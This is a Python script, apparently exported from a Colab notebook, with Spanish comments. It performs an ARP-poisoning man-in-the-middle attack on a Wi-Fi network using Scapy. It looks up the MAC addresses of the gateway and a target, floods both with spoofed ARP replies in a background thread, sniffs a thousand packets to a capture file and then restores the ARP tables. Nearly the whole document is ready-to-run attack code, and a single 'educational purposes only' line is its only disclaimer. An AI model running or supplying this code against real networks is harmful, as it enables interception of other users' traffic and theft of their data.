# -*- coding: utf-8 -*-
"""MTIM-Wifi.ipynb

Automatically generated by Colaboratory.

Original file is located at
    https://colab.research.google.com/drive/1Kic2ifXjIAF-8D4NZmn_gqSmFTj66pZH

A continuación, te proporciono un ejemplo de código en Python que utiliza la biblioteca Scapy para realizar un ataque de “Man-in-the-Middle” (MITM) en una red Wi-Fi abierta y capturar paquetes de red. Este código es solo para fines educativos y no debe ser utilizado para fines malintencionados.
"""

from scapy.all import *
import os
import sys
import threading

interface = "wlan0"
target_ip = "192.168.1.1"
gateway_ip = "192.168.1.254"
packet_count = 1000

conf.iface = interface

conf.verb = 0

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    print("[*] Restaurando ARP targets...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

def get_mac(ip_address):
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)

    for s,r in responses:
        return r[Ether].src

    return None

def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst= target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst= gateway_mac

    print("[*] Iniciando ataque MITM. [CTRL-C para detener]")

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)

        except KeyboardInterrupt:
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

    print("[*] Ataque MITM finalizado.")
    return

print("[*] Configurando interceptación de paquetes.")

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print("[!!!] No se pudo obtener la dirección MAC de la puerta de enlace. Saliendo.")
    sys.exit(0)
else:
    print("[*] Dirección MAC de la puerta de enlace: " + gateway_mac)

target_mac = get_mac(target_ip)

if target_mac is None:
    print("[!!!] No se pudo obtener la dirección MAC del objetivo. Saliendo.")
    sys.exit(0)
else:
    print("[*] Dirección MAC del objetivo: " + target_mac)

poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print("[*] Capturando paquetes.")
    packets = sniff(count=packet_count, iface=interface)

    wrpcap('arper.pcap',packets)

    print("[*] Paquetes capturados.")

    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

except KeyboardInterrupt:
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    sys.exit(0)

"""Este código realiza un ataque MITM en una red Wi-Fi abierta y captura paquetes de red. El código utiliza la biblioteca Scapy para construir y enviar paquetes de red. El código también utiliza la biblioteca threading para ejecutar el ataque MITM en un hilo separado del hilo principal."""